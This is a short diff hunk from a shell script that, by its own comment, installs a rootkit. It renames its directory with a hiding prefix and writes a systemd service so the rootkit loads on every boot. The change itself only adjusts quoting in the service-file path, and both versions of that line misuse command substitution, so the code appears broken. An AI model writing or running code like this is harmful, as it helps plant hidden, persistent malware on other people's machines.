@@ -16,7 +16,7 @@ if test -f "$koFile"; then
     mv "$thisDirPath" '../'"$magicPrefix""$thisDir"
 
     # Load rootkit on boot:
-    loadServicePath=$('/etc/systemd/system/'"$magicPrefix"'load.service')
+    loadServicePath=$("/etc/systemd/system/""$magicPrefix""load.service")
     touch "$loadServicePath"
     echo "[Unit]" >> "$loadServicePath"
     echo "Description=Joe Mamma" >> "$loadServicePath"
